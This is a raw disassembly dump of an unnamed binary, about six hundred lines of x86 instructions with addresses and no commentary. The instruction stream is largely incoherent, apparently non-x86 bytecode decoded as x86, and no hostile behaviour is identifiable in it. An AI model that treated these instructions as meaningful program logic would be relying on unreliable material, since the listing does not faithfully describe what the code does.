  4026c9:	add    al,0x6f
  4026cb:	inc    ebx
  4026cc:	add    BYTE PTR [eax],al
  4026ce:	or     al,BYTE PTR [edx]
  4026d0:	adc    al,0x7d
  4026d2:	add    BYTE PTR ss:[eax],al
  4026d5:	add    al,0x2a
  4026d7:	add    BYTE PTR [ebx],bl
  4026d9:	xor    BYTE PTR [ecx],al
  4026db:	add    BYTE PTR [esi],ch
  4026dd:	add    BYTE PTR [eax],al
  4026df:	add    BYTE PTR [ecx],cl
  4026e1:	add    BYTE PTR [eax],al
  4026e3:	adc    DWORD PTR [edx],eax
  4026e5:	jnp    0x40271e
  4026e7:	add    BYTE PTR [eax],al
  4026e9:	add    al,0x28
  4026eb:	inc    esp
  4026ec:	add    BYTE PTR [eax],al
  4026ee:	or     ch,BYTE PTR [ecx+eax*1]
  4026f1:	sub    al,BYTE PTR [edx]
  4026f3:	jnp    0x40272c
  4026f5:	add    BYTE PTR [eax],al
  4026f7:	add    al,0x28
  4026f9:	inc    ebp
  4026fa:	add    BYTE PTR [eax],al
  4026fc:	or     cl,BYTE PTR [edx]
  4026fe:	push   es
  4026ff:	outs   dx,DWORD PTR ds:[esi]
  402700:	inc    esi
  402701:	add    BYTE PTR [eax],al
  402703:	or     ah,BYTE PTR [esi]
  402705:	fimul  WORD PTR [edx]
  402707:	push   es
  402708:	sub    al,0x6
  40270a:	push   es
  40270b:	outs   dx,DWORD PTR ds:[esi]
  40270c:	inc    edi
  40270d:	add    BYTE PTR [eax],al
  40270f:	or     bl,ah
  402711:	sub    al,BYTE PTR [eax]
  402713:	add    BYTE PTR [ecx],al
  402715:	adc    BYTE PTR [eax],al
  402717:	add    BYTE PTR [edx],al
  402719:	add    BYTE PTR [edx],bl
  40271b:	add    BYTE PTR [ecx],cl
  40271d:	and    eax,DWORD PTR [eax]
  40271f:	or     al,BYTE PTR [eax]
  402721:	add    BYTE PTR [eax],al
  402723:	add    BYTE PTR [edx+0x3],al
  402726:	jle    0x402752
  402728:	add    BYTE PTR [eax],al
  40272a:	or     dh,BYTE PTR [ebx]
  40272c:	pop    es
  40272d:	add    al,BYTE PTR [edi*2+0x4000037]
  402734:	sub    bl,BYTE PTR [edx]
  402736:	jle    0x402780
  402738:	add    BYTE PTR [eax],al
  40273a:	or     ch,BYTE PTR [edx]
  40273c:	sbb    bh,BYTE PTR [esi+0x35]
  40273f:	add    BYTE PTR [eax],al
  402741:	add    al,0x2a
  402743:	sub    BYTE PTR cs:0x6f060000,ah
  40274a:	daa    
  40274b:	add    BYTE PTR [eax],al
  40274d:	push   es
  40274e:	sub    dl,BYTE PTR [esi+0x2]
  402751:	jnp    0x402789
  402753:	add    BYTE PTR [eax],al
  402755:	add    al,0x2c
  402757:	or     al,0x2
  402759:	jnp    0x402791
  40275b:	add    BYTE PTR [eax],al
  40275d:	add    al,0x6f
  40275f:	dec    ecx
  402760:	add    BYTE PTR [eax],al
  402762:	or     ah,BYTE PTR [esi]
  402764:	sub    ch,BYTE PTR [esi]
  402766:	jae    0x402783
  402768:	add    BYTE PTR [eax],al
  40276a:	push   es
  40276b:	xor    BYTE PTR ds:0x2a040000,0x6
  402772:	sub    al,BYTE PTR [eax]
  402774:	sbb    esi,DWORD PTR [eax]
  402776:	add    al,BYTE PTR [eax]
  402778:	ins    DWORD PTR es:[edi],dx
  402779:	add    BYTE PTR [eax],al
  40277b:	add    BYTE PTR [edx],cl
  40277d:	add    BYTE PTR [eax],al
  40277f:	adc    DWORD PTR [edi+ebp*2],eax
  402782:	dec    edx
  402783:	add    BYTE PTR [eax],al
  402785:	or     ch,BYTE PTR [edi+0x4b]
  402788:	add    BYTE PTR [eax],al
  40278a:	or     cl,BYTE PTR [ebx+ebp*1]
  40278d:	dec    edx
  40278e:	or     BYTE PTR [edi+0x4c],ch
  402791:	add    BYTE PTR [eax],al
  402793:	or     dh,BYTE PTR [ebp+ecx*2+0x0]
  402797:	add    BYTE PTR [ecx],al
  402799:	or     al,BYTE PTR [esi]
  40279b:	outs   dx,DWORD PTR ds:[esi]
  40279c:	dec    ebp
  40279d:	add    BYTE PTR [eax],al
  40279f:	or     ch,BYTE PTR [edi+0x4e]
  4027a2:	add    BYTE PTR [eax],al
  4027a4:	or     cl,BYTE PTR ds:0x6f091c2b
  4027aa:	dec    edi
  4027ab:	add    BYTE PTR [eax],al
  4027ad:	or     cl,BYTE PTR [ebx]
  4027af:	pop    es
  4027b0:	outs   dx,DWORD PTR ds:[esi]
  4027b1:	push   eax
  4027b2:	add    BYTE PTR [eax],al
  4027b4:	or     ch,BYTE PTR [edi+0x51]
  4027b7:	add    BYTE PTR [eax],al
  4027b9:	or     dh,BYTE PTR [ebx+0x2f]
  4027bc:	add    BYTE PTR [eax],al
  4027be:	push   es
  4027bf:	outs   dx,DWORD PTR ds:[esi]
  4027c0:	push   edx
  4027c1:	add    BYTE PTR [eax],al
  4027c3:	or     cl,BYTE PTR [ecx]
  4027c5:	outs   dx,DWORD PTR ds:[esi]
  4027c6:	push   ebx
  4027c7:	add    BYTE PTR [eax],al
  4027c9:	or     ch,BYTE PTR ds:0x90adedc
  4027cf:	sub    al,0x6
  4027d1:	or     DWORD PTR [edi+0x47],ebp
  4027d4:	add    BYTE PTR [eax],al
  4027d6:	or     bl,ah
  4027d8:	or     BYTE PTR [edi+0x53],ch
  4027db:	add    BYTE PTR [eax],al
  4027dd:	or     ch,BYTE PTR ds:0x80adeae
  4027e3:	sub    al,0x6
  4027e5:	or     BYTE PTR [edi+0x47],ch
  4027e8:	add    BYTE PTR [eax],al
  4027ea:	or     bl,ah
  4027ec:	sub    al,BYTE PTR [eax]
  4027ee:	add    BYTE PTR [eax],al
  4027f0:	add    DWORD PTR [eax+eax*1],ebx
  4027f3:	add    BYTE PTR [edx],al
  4027f5:	add    BYTE PTR [esi],ah
  4027f7:	add    BYTE PTR [eax],ch
  4027f9:	dec    esi
  4027fa:	add    BYTE PTR [edx],cl
  4027fc:	add    BYTE PTR [eax],al
  4027fe:	add    BYTE PTR [eax],al
  402800:	add    al,BYTE PTR [eax]
  402802:	or     al,0x0
  402804:	push   esi
  402805:	bound  eax,QWORD PTR [eax]
  402807:	or     al,BYTE PTR [eax]
  402809:	add    BYTE PTR [eax],al
  40280b:	add    BYTE PTR [esi],al
  40280d:	sub    bl,BYTE PTR [esi]
  40280f:	add    ch,BYTE PTR [eax]
  402811:	pop    ss
  402812:	add    BYTE PTR [eax],al
  402814:	or     ch,BYTE PTR [edx]
  402816:	add    BYTE PTR [eax],al
  402818:	adc    esi,DWORD PTR [eax]
  40281a:	add    al,BYTE PTR [eax]
  40281c:	add    BYTE PTR ss:[eax],al
  40281f:	add    BYTE PTR [ebx],cl
  402821:	add    BYTE PTR [eax],al
  402823:	adc    DWORD PTR [eax],ebp
  402825:	push   esp
  402826:	add    BYTE PTR [eax],al
  402828:	or     ch,BYTE PTR [edi+0x55]
  40282b:	add    BYTE PTR [eax],al
  40282d:	or     ch,BYTE PTR [edi+0x56]
  402830:	add    BYTE PTR [eax],al
  402832:	or     ch,BYTE PTR [edi+0x57]
  402835:	add    BYTE PTR [eax],al
  402837:	or     cl,BYTE PTR [edx]
  402839:	sub    BYTE PTR [eax+0x0],bl
  40283c:	add    BYTE PTR [edx],cl
  40283e:	outs   dx,DWORD PTR ds:[esi]
  40283f:	pop    ecx
  402840:	add    BYTE PTR [eax],al
  402842:	or     cl,BYTE PTR [ebx]
  402844:	push   es
  402845:	pop    es
  402846:	sub    BYTE PTR [edx+0x0],bl
  402849:	add    BYTE PTR [edx],cl
  40284b:	sub    al,0xb
  40284d:	sub    BYTE PTR [ebx+0x0],bl
  402850:	add    BYTE PTR [esi],al
  402852:	jae    0x402871
  402854:	add    BYTE PTR [eax],al
  402856:	or     bh,BYTE PTR [edx+0x14]
  402859:	sub    al,BYTE PTR [esi]
  40285b:	sub    bl,BYTE PTR [esi]
  40285d:	add    ch,BYTE PTR [eax]
  40285f:	pop    ss
  402860:	add    BYTE PTR [eax],al
  402862:	or     ch,BYTE PTR [edx]
  402864:	push   esi
  402865:	add    ch,BYTE PTR [eax]
  402867:	pop    ss
  402868:	add    BYTE PTR [eax],al
  40286a:	or     al,BYTE PTR [edx]
  40286c:	add    edi,DWORD PTR [ebp+0x38]
  40286f:	add    BYTE PTR [eax],al
  402871:	add    al,0x2
  402873:	add    al,0x7d
  402875:	cmp    DWORD PTR [eax],eax
  402877:	add    BYTE PTR [edx+ebp*1],al
  40287a:	push   ds
  40287b:	add    ch,BYTE PTR [eax]
  40287d:	pop    ss
  40287e:	add    BYTE PTR [eax],al
  402880:	or     ch,BYTE PTR [edx]
  402882:	jbe    0x402886
  402884:	add    bh,BYTE PTR [ebx+0x4d]
  402887:	add    BYTE PTR [eax],al
  402889:	add    al,0x7b
  40288b:	cmp    BYTE PTR [eax],al
  40288d:	add    BYTE PTR [edx+eax*1],al
  402890:	jnp    0x4028dd
  402892:	add    BYTE PTR [eax],al
  402894:	add    al,0x6f
  402896:	inc    ebp
  402897:	add    BYTE PTR [eax],al
  402899:	push   es
  40289a:	jge    0x4028e8
  40289c:	add    BYTE PTR [eax],al
  40289e:	add    al,0x2a
  4028a0:	adc    esi,DWORD PTR [eax]
  4028a2:	add    al,0x0
  4028a4:	cmp    DWORD PTR [eax],eax
  4028a6:	add    BYTE PTR [eax],al
  4028a8:	or     al,0x0
  4028aa:	add    BYTE PTR [ecx],dl
  4028ac:	jae    0x40283d
  4028ae:	add    BYTE PTR [eax],al
  4028b0:	push   es
  4028b1:	or     al,BYTE PTR [esi]
  4028b3:	add    bh,BYTE PTR [ebp+0x4d]
  4028b6:	add    BYTE PTR [eax],al
  4028b8:	add    al,0x6
  4028ba:	add    ebp,DWORD PTR [edi+0x5d]
  4028bd:	add    BYTE PTR [eax],al
  4028bf:	or     bh,BYTE PTR [ebp+0x4b]
  4028c2:	add    BYTE PTR [eax],al
  4028c4:	add    al,0x6
  4028c6:	adc    al,0x7d
  4028c8:	dec    esp
  4028c9:	add    BYTE PTR [eax],al
  4028cb:	add    al,0x2
  4028cd:	push   es
  4028ce:	inc    BYTE PTR [esi]
  4028d0:	nop
  4028d1:	add    BYTE PTR [eax],al
  4028d3:	push   es
  4028d4:	jae    0x402907
  4028d6:	add    BYTE PTR [eax],al
  4028d8:	or     ch,BYTE PTR [eax]
  4028da:	push   edi
  4028db:	add    BYTE PTR [eax],al
  4028dd:	push   es
  4028de:	push   es
  4028df:	jnp    0x40292d
  4028e1:	add    BYTE PTR [eax],al
  4028e3:	add    al,0x2a
  4028e5:	push   ds
  4028e6:	add    ch,BYTE PTR [eax]
  4028e8:	pop    ss
  4028e9:	add    BYTE PTR [eax],al
  4028eb:	or     ch,BYTE PTR [edx]
  4028ed:	mov    es,WORD PTR [edx]
  4028ef:	add    bh,BYTE PTR [ebx+0x50]
  4028f2:	add    BYTE PTR [eax],al
  4028f4:	add    al,0x7b
  4028f6:	cmp    BYTE PTR [eax],al
  4028f8:	add    BYTE PTR [edx+eax*1],al
  4028fb:	jnp    0x40294e
  4028fd:	add    BYTE PTR [eax],al
  4028ff:	add    al,0x2
  402901:	jl     0x402951
  402903:	add    BYTE PTR [eax],al
  402905:	add    al,0x6f
  402907:	inc    esi
  402908:	add    BYTE PTR [eax],al
  40290a:	push   es
  40290b:	jge    0x40295c
  40290d:	add    BYTE PTR [eax],al
  40290f:	add    al,0x2a
  402911:	add    BYTE PTR [eax],al
  402913:	add    BYTE PTR [ebx],dl
  402915:	xor    BYTE PTR [eax+eax*1],al
  402918:	inc    ebx
  402919:	add    BYTE PTR [eax],al
  40291b:	add    BYTE PTR ds:0x73110000,cl
  402921:	xchg   ecx,eax
  402922:	add    BYTE PTR [eax],al
  402924:	push   es
  402925:	or     al,BYTE PTR [esi]
  402927:	add    edi,DWORD PTR [ebp+0x51]
  40292a:	add    BYTE PTR [eax],al
  40292c:	add    al,0x6
  40292e:	add    bh,BYTE PTR [ebp+0x50]
  402931:	add    BYTE PTR [eax],al
  402933:	add    al,0x6
  402935:	adc    al,0x7d
  402937:	dec    esi
  402938:	add    BYTE PTR [eax],al
  40293a:	add    al,0x6
  40293c:	adc    al,0x7d
  40293e:	dec    edi
  40293f:	add    BYTE PTR [eax],al
  402941:	add    al,0x2
  402943:	push   es
  402944:	inc    BYTE PTR [esi]
  402946:	xchg   edx,eax
  402947:	add    BYTE PTR [eax],al
  402949:	push   es
  40294a:	jae    0x40297d
  40294c:	add    BYTE PTR [eax],al
  40294e:	or     ch,BYTE PTR [eax]
  402950:	push   edi
  402951:	add    BYTE PTR [eax],al
  402953:	push   es
  402954:	add    al,0x6
  402956:	jnp    0x4029a6
  402958:	add    BYTE PTR [eax],al
  40295a:	add    al,0x51
  40295c:	push   es
  40295d:	jnp    0x4029ae
  40295f:	add    BYTE PTR [eax],al
  402961:	add    al,0x2a
  402963:	push   ds
  402964:	add    ch,BYTE PTR [eax]
  402966:	pop    ss
  402967:	add    BYTE PTR [eax],al
  402969:	or     ch,BYTE PTR [edx]
  40296b:	jbe    0x40296f
  40296d:	add    bh,BYTE PTR [ebx+0x53]
  402970:	add    BYTE PTR [eax],al
  402972:	add    al,0x7b
  402974:	cmp    BYTE PTR [eax],al
  402976:	add    BYTE PTR [edx+eax*1],al
  402979:	jnp    0x4029cf
  40297b:	add    BYTE PTR [eax],al
  40297d:	add    al,0x6f
  40297f:	inc    edi
  402980:	add    BYTE PTR [eax],al
  402982:	push   es
  402983:	jge    0x4029d7
  402985:	add    BYTE PTR [eax],al
  402987:	add    al,0x2a
  402989:	add    BYTE PTR [eax],al
  40298b:	add    BYTE PTR [ebx],dl
  40298d:	xor    BYTE PTR [eax+eax*1],al
  402990:	add    BYTE PTR ds:[eax],al
  402993:	add    BYTE PTR [esi],cl
  402995:	add    BYTE PTR [eax],al
  402997:	adc    DWORD PTR [ebx-0x6d],esi
  40299a:	add    BYTE PTR [eax],al
  40299c:	push   es
  40299d:	or     al,BYTE PTR [esi]
  40299f:	add    edi,DWORD PTR [ebp+0x54]
  4029a2:	add    BYTE PTR [eax],al
  4029a4:	add    al,0x6
  4029a6:	add    bh,BYTE PTR [ebp+0x53]
  4029a9:	add    BYTE PTR [eax],al
  4029ab:	add    al,0x6
  4029ad:	adc    al,0x7d
  4029af:	push   edx
  4029b0:	add    BYTE PTR [eax],al
  4029b2:	add    al,0x2
  4029b4:	push   es
  4029b5:	inc    BYTE PTR [esi]
  4029b7:	xchg   esp,eax
  4029b8:	add    BYTE PTR [eax],al
  4029ba:	push   es
  4029bb:	jae    0x4029ee
  4029bd:	add    BYTE PTR [eax],al
  4029bf:	or     ch,BYTE PTR [eax]
  4029c1:	push   edi
  4029c2:	add    BYTE PTR [eax],al
  4029c4:	push   es
  4029c5:	push   es
  4029c6:	jnp    0x402a1a
  4029c8:	add    BYTE PTR [eax],al
  4029ca:	add    al,0x28
  4029cc:	pop    esi
  4029cd:	add    BYTE PTR [eax],al
  4029cf:	or     dh,BYTE PTR [esp+edx*1+0x0]
  4029d3:	add    BYTE PTR [ecx],al
  4029d5:	sub    bl,BYTE PTR [esi]
  4029d7:	add    ch,BYTE PTR [eax]
  4029d9:	pop    ss
  4029da:	add    BYTE PTR [eax],al
  4029dc:	or     ch,BYTE PTR [edx]
  4029de:	jbe    0x4029e2
  4029e0:	add    bh,BYTE PTR [ebx+0x56]
  4029e3:	add    BYTE PTR [eax],al
  4029e5:	add    al,0x7b
  4029e7:	cmp    BYTE PTR [eax],al
  4029e9:	add    BYTE PTR [edx+eax*1],al
  4029ec:	jnp    0x402a45
  4029ee:	add    BYTE PTR [eax],al
  4029f0:	add    al,0x6f
  4029f2:	dec    eax
  4029f3:	add    BYTE PTR [eax],al
  4029f5:	push   es
  4029f6:	jge    0x402a4d
  4029f8:	add    BYTE PTR [eax],al
  4029fa:	add    al,0x2a
  4029fc:	adc    esi,DWORD PTR [eax]
  4029fe:	add    al,0x0
  402a00:	add    BYTE PTR ds:[eax],al
  402a03:	add    BYTE PTR [edi],cl
  402a05:	add    BYTE PTR [eax],al
  402a07:	adc    DWORD PTR [ebx-0x6b],esi
  402a0a:	add    BYTE PTR [eax],al
  402a0c:	push   es
  402a0d:	or     al,BYTE PTR [esi]
  402a0f:	add    edi,DWORD PTR [ebp+0x57]
  402a12:	add    BYTE PTR [eax],al
  402a14:	add    al,0x6
  402a16:	add    bh,BYTE PTR [ebp+0x56]
  402a19:	add    BYTE PTR [eax],al
  402a1b:	add    al,0x6
  402a1d:	adc    al,0x7d
  402a1f:	push   ebp
  402a20:	add    BYTE PTR [eax],al
  402a22:	add    al,0x2
  402a24:	push   es
  402a25:	inc    BYTE PTR [esi]
  402a27:	xchg   esi,eax
  402a28:	add    BYTE PTR [eax],al
  402a2a:	push   es
  402a2b:	jae    0x402a5e
  402a2d:	add    BYTE PTR [eax],al
  402a2f:	or     ch,BYTE PTR [eax]
  402a31:	push   edi
  402a32:	add    BYTE PTR [eax],al
  402a34:	push   es
  402a35:	push   es
  402a36:	jnp    0x402a8d
  402a38:	add    BYTE PTR [eax],al
  402a3a:	add    al,0x28
  402a3c:	pop    esi
  402a3d:	add    BYTE PTR [eax],al
  402a3f:	or     dh,BYTE PTR [ebp+edx*1+0x0]
  402a43:	add    BYTE PTR [ecx],al
  402a45:	sub    ch,BYTE PTR [esi]
  402a47:	jb     0x402ab0
  402a49:	add    DWORD PTR [eax],eax
  402a4b:	jo     0x402ac0
  402a4d:	pop    edi
  402a4e:	add    BYTE PTR [eax],al
  402a50:	or     bh,BYTE PTR [edx+0xa]
  402a53:	push   ss
  402a54:	sub    bl,BYTE PTR [esi]
  402a56:	add    ch,BYTE PTR [eax]
  402a58:	pop    ss
  402a59:	add    BYTE PTR [eax],al
  402a5b:	or     ch,BYTE PTR [edx]
  402a5d:	mov    edx,0x5a7b02
  402a62:	add    BYTE PTR [ebx+edi*2],al
  402a65:	cmp    BYTE PTR [eax],al
  402a67:	add    BYTE PTR [edx+eax*1],al
  402a6a:	jnp    0x402ac7
  402a6c:	add    BYTE PTR [eax],al
  402a6e:	add    al,0x6f
  402a70:	pop    ebp
  402a71:	add    BYTE PTR [eax],al
  402a73:	or     al,BYTE PTR [edx]
  402a75:	jnp    0x402ad3
  402a77:	add    BYTE PTR [eax],al
  402a79:	add    al,0x2
  402a7b:	jl     0x402ad5
  402a7d:	add    BYTE PTR [eax],al
  402a7f:	add    al,0x2
  402a81:	jl     0x402adc
  402a83:	add    BYTE PTR [eax],al
  402a85:	add    al,0x6f
  402a87:	dec    ecx
  402a88:	add    BYTE PTR [eax],al
  402a8a:	push   es
  402a8b:	sub    dl,BYTE PTR [ebx]
  402a8d:	xor    BYTE PTR [eax+eax*1],al
  402a90:	dec    ebp
  402a91:	add    BYTE PTR [eax],al
  402a93:	add    BYTE PTR [eax],dl
  402a95:	add    BYTE PTR [eax],al
  402a97:	adc    DWORD PTR [ebx-0x69],esi
  402a9a:	add    BYTE PTR [eax],al
  402a9c:	push   es
  402a9d:	or     al,BYTE PTR [esi]
  402a9f:	add    edi,DWORD PTR [ebp+0x5b]
  402aa2:	add    BYTE PTR [eax],al
  402aa4:	add    al,0x6
  402aa6:	add    al,0x7d
  402aa8:	pop    esp
  402aa9:	add    BYTE PTR [eax],al
  402aab:	add    al,0x6
  402aad:	add    bh,BYTE PTR [ebp+0x5a]
  402ab0:	add    BYTE PTR [eax],al
  402ab2:	add    al,0x6
  402ab4:	adc    al,0x7d
  402ab6:	pop    eax
  402ab7:	add    BYTE PTR [eax],al
  402ab9:	add    al,0x6
  402abb:	adc    al,0x7d
  402abd:	pop    ecx
  402abe:	add    BYTE PTR [eax],al
  402ac0:	add    al,0x2
  402ac2:	push   es
  402ac3:	inc    BYTE PTR [esi]
  402ac5:	cwde   
  402ac6:	add    BYTE PTR [eax],al
  402ac8:	push   es
  402ac9:	jae    0x402afc
  402acb:	add    BYTE PTR [eax],al
  402acd:	or     ch,BYTE PTR [eax]
  402acf:	push   edi
  402ad0:	add    BYTE PTR [eax],al
  402ad2:	push   es
  402ad3:	add    eax,0x587b06
  402ad8:	add    BYTE PTR [ecx+edx*2],al
  402adb:	push   cs
  402adc:	add    al,0x6
  402ade:	jnp    0x402b39
  402ae0:	add    BYTE PTR [eax],al
  402ae2:	add    al,0x51
  402ae4:	sub    bl,BYTE PTR [esi]
  402ae6:	add    ch,BYTE PTR [eax]
  402ae8:	pop    ss
  402ae9:	add    BYTE PTR [eax],al
  402aeb:	or     ch,BYTE PTR [edx]
  402aed:	mov    ds:0x5f7b0202,al
  402af2:	add    BYTE PTR [eax],al
  402af4:	add    al,0x7b
  402af6:	cmp    BYTE PTR [eax],al
  402af8:	add    BYTE PTR [edx+eax*1],al
  402afb:	jnp    0x402b5d
  402afd:	add    BYTE PTR [eax],al
  402aff:	add    al,0x6f
  402b01:	pop    ebp
  402b02:	add    BYTE PTR [eax],al
  402b04:	or     al,BYTE PTR [edx]
  402b06:	jl     0x402b65
  402b08:	add    BYTE PTR [eax],al
  402b0a:	add    al,0x6f
  402b0c:	dec    edx
  402b0d:	add    BYTE PTR [eax],al
  402b0f:	push   es
  402b10:	jge    0x402b70
  402b12:	add    BYTE PTR [eax],al
  402b14:	add    al,0x2a
  402b16:	add    BYTE PTR [eax],al
  402b18:	adc    esi,DWORD PTR [eax]
  402b1a:	add    al,0x0
  402b1c:	inc    ebx
  402b1d:	add    BYTE PTR [eax],al
  402b1f:	add    BYTE PTR [ecx],dl
  402b21:	add    BYTE PTR [eax],al
  402b23:	adc    DWORD PTR [ebx-0x67],esi
  402b26:	add    BYTE PTR [eax],al
  402b28:	push   es
  402b29:	or     al,BYTE PTR [esi]
  402b2b:	add    edi,DWORD PTR [ebp+0x60]
  402b2e:	add    BYTE PTR [eax],al
  402b30:	add    al,0x6
  402b32:	add    bh,BYTE PTR [ebp+0x5f]
  402b35:	add    BYTE PTR [eax],al
  402b37:	add    al,0x6
  402b39:	push   ss
  402b3a:	jge    0x402b99
  402b3c:	add    BYTE PTR [eax],al
  402b3e:	add    al,0x6
  402b40:	adc    al,0x7d
  402b42:	pop    esi
  402b43:	add    BYTE PTR [eax],al
  402b45:	add    al,0x2
  402b47:	push   es
  402b48:	inc    BYTE PTR [esi]
  402b4a:	call   0x31:0x73060000
  402b51:	add    BYTE PTR [edx],cl
  402b53:	sub    BYTE PTR [edi+0x0],dl
  402b56:	add    BYTE PTR [esi],al
  402b58:	add    al,0x6
  402b5a:	jnp    0x402bb9
  402b5c:	add    BYTE PTR [eax],al
  402b5e:	add    al,0x52
  402b60:	push   es
  402b61:	jnp    0x402bc1
  402b63:	add    BYTE PTR [eax],al
  402b65:	add    al,0x2a
  402b67:	push   ds
  402b68:	add    ch,BYTE PTR [eax]
  402b6a:	pop    ss
  402b6b:	add    BYTE PTR [eax],al
  402b6d:	or     ch,BYTE PTR [edx]
  402b6f:	mov    al,BYTE PTR [edx]
  402b71:	jnp    0x402bd4
  402b73:	add    BYTE PTR [eax],al
  402b75:	add    al,0x7b
  402b77:	cmp    BYTE PTR [eax],al
  402b79:	add    BYTE PTR [edx+eax*1],al
  402b7c:	jnp    0x402be0
  402b7e:	add    BYTE PTR [eax],al
  402b80:	add    al,0x6f
  402b82:	pop    ebp
  402b83:	add    BYTE PTR [eax],al
  402b85:	or     al,BYTE PTR [edx]
  402b87:	jnp    0x402bec
  402b89:	add    BYTE PTR [eax],al
  402b8b:	add    al,0x6f
  402b8d:	dec    ebx
  402b8e:	add    BYTE PTR [eax],al
  402b90:	push   es
  402b91:	sub    al,BYTE PTR [eax]
  402b93:	add    BYTE PTR [ebx],dl
  402b95:	xor    BYTE PTR [eax+eax*1],al
  402b98:	add    BYTE PTR cs:[eax],al
  402b9b:	add    BYTE PTR [edx],dl
  402b9d:	add    BYTE PTR [eax],al
  402b9f:	adc    DWORD PTR [ebx-0x65],esi
  402ba2:	add    BYTE PTR [eax],al
  402ba4:	push   es
  402ba5:	or     al,BYTE PTR [esi]
  402ba7:	add    edi,DWORD PTR [ebp+0x62]
  402baa:	add    BYTE PTR [eax],al
  402bac:	add    al,0x6
  402bae:	add    al,0x7d
  402bb0:	arpl   WORD PTR [eax],ax
  402bb2:	add    BYTE PTR [esi+eax*1],al
  402bb5:	add    bh,BYTE PTR [ebp+0x61]
  402bb8:	add    BYTE PTR [eax],al
  402bba:	add    al,0x2
  402bbc:	push   es
  402bbd:	inc    BYTE PTR [esi]
  402bbf:	pushf  
  402bc0:	add    BYTE PTR [eax],al
  402bc2:	push   es
  402bc3:	jae    0x402bf6
  402bc5:	add    BYTE PTR [eax],al
  402bc7:	or     ch,BYTE PTR [eax]
  402bc9:	push   edi
  402bca:	add    BYTE PTR [eax],al
  402bcc:	push   es
  402bcd:	sub    al,BYTE PTR [eax]
  402bcf:	add    BYTE PTR [ebx],bl
  402bd1:	xor    BYTE PTR [ebx],al
  402bd3:	add    BYTE PTR [eax],bl
  402bd5:	add    BYTE PTR [eax],al
  402bd7:	add    BYTE PTR [ebx],dl
  402bd9:	add    BYTE PTR [eax],al
  402bdb:	adc    DWORD PTR [edx],eax
  402bdd:	jnp    0x402c18
  402bdf:	add    BYTE PTR [eax],al
  402be1:	add    al,0x3
  402be3:	pop    ss
  402be4:	outs   dx,DWORD PTR ds:[esi]
  402be5:	mov    WORD PTR [eax],es
  402be7:	add    BYTE PTR [esi],al
  402be9:	fimul  WORD PTR [eax]
  402beb:	or     al,BYTE PTR [esi]
  402bed:	sub    BYTE PTR [eax+0x0],ah
  402bf0:	add    BYTE PTR [edx],cl
  402bf2:	jp     0x402c1e
  402bf4:	add    DWORD PTR [eax],edx
  402bf6:	add    BYTE PTR [eax],al
  402bf8:	add    BYTE PTR [eax],al
  402bfa:	add    BYTE PTR [eax],al
  402bfc:	(bad)  
  402bfd:	str    WORD PTR [eax]
  402c00:	pop    ebx
  402c01:	add    BYTE PTR [eax],al
  402c03:	add    DWORD PTR [esi],ebx
  402c05:	add    ch,BYTE PTR [eax]
  402c07:	pop    ss
  402c08:	add    BYTE PTR [eax],al
  402c0a:	or     ch,BYTE PTR [edx]
  402c0c:	sbb    ch,BYTE PTR [eax]
  402c0e:	pop    ebp
  402c0f:	add    BYTE PTR [eax],al
  402c11:	push   es
  402c12:	sub    bl,BYTE PTR [esi]
  402c14:	add    ch,BYTE PTR [eax]
  402c16:	pop    esi
  402c17:	add    BYTE PTR [eax],al
  402c19:	push   es
  402c1a:	sub    ch,BYTE PTR [esi]
  402c1c:	jb     0x402bed
  402c1e:	add    DWORD PTR [eax],eax
  402c20:	jo     0x402c4a
  402c22:	pop    edi
  402c23:	add    BYTE PTR [eax],al
  402c25:	push   es
  402c26:	sub    bl,BYTE PTR [esi]
  402c28:	add    ch,BYTE PTR [eax]
  402c2a:	pop    ss
  402c2b:	add    BYTE PTR [eax],al
  402c2d:	or     ch,BYTE PTR [edx]
  402c2f:	sbb    bh,BYTE PTR [esi+0x3c]
  402c32:	add    BYTE PTR [eax],al
  402c34:	add    al,0x2a
  402c36:	push   ds
  402c37:	add    al,BYTE PTR [eax+0x400003c]
  402c3d:	sub    al,BYTE PTR [esi+0x7e]
  402c40:	cmp    eax,DWORD PTR [eax]
  402c42:	add    BYTE PTR [edx+eax*1],al
  402c45:	jle    0x402c83
  402c47:	add    BYTE PTR [eax],al
  402c49:	add    al,0x6f
  402c4b:	and    eax,DWORD PTR [eax]
  402c4d:	add    BYTE PTR [edx],cl
  402c4f:	sub    dl,dl
  402c51:	ror    BYTE PTR [edi],1
  402c53:	add    BYTE PTR [eax],al
  402c55:	add    ch,BYTE PTR [eax]
  402c57:	add    BYTE PTR es:[eax],al
  402c5a:	or     ch,BYTE PTR [edi+0x62]
  402c5d:	add    BYTE PTR [eax],al
  402c5f:	or     dl,al
  402c61:	sldt   WORD PTR [eax]
  402c64:	add    ch,BYTE PTR [eax]
  402c66:	add    BYTE PTR es:[eax],al
  402c69:	or     ch,BYTE PTR [edi+0x27]
  402c6c:	add    BYTE PTR [eax],al
  402c6e:	or     ch,BYTE PTR [edi+0x28]
  402c71:	add    BYTE PTR [eax],al
  402c73:	or     dh,BYTE PTR [ebx+0x29]
  402c76:	add    BYTE PTR [eax],al
  402c78:	or     al,BYTE PTR [eax+0x400003b]
  402c7e:	adc    al,0x80
  402c80:	cmp    al,0x0
  402c82:	add    BYTE PTR [edx+ebp*1],al
  402c85:	add    BYTE PTR [eax],al
  402c87:	add    BYTE PTR [ebx],dl
  402c89:	xor    BYTE PTR [ebx],al
  402c8b:	add    BYTE PTR [ecx],ch
  402c8d:	add    BYTE PTR [eax],al
  402c8f:	add    BYTE PTR [eax+eax*1],dl
  402c92:	add    BYTE PTR [ecx],dl
  402c94:	add    bh,BYTE PTR [ebx+0x3d]
  402c97:	add    BYTE PTR [eax],al
  402c99:	add    al,0xa
  402c9b:	push   es
  402c9c:	or     eax,DWORD PTR [edi]
  402c9e:	add    ebp,DWORD PTR [eax]
  402ca0:	add    BYTE PTR fs:[eax],al
  402ca3:	or     dh,BYTE PTR [esi+edx*1+0x0]
  402ca7:	add    BYTE PTR [ecx],al
  402ca9:	or     al,0x2
  402cab:	jl     0x402cea
  402cad:	add    BYTE PTR [eax],al
  402caf:	add    al,0x8
  402cb1:	pop    es
  402cb2:	sub    BYTE PTR [ecx],al
  402cb4:	add    BYTE PTR [eax],al
  402cb6:	sub    ecx,DWORD PTR [edx]
  402cb8:	push   es
  402cb9:	pop    es
  402cba:	xor    ebx,edi
  402cbc:	sub    al,BYTE PTR [eax]
  402cbe:	add    BYTE PTR [eax],al
  402cc0:	adc    esi,DWORD PTR [eax]
  402cc2:	add    eax,DWORD PTR [eax]
  402cc4:	sub    DWORD PTR [eax],eax
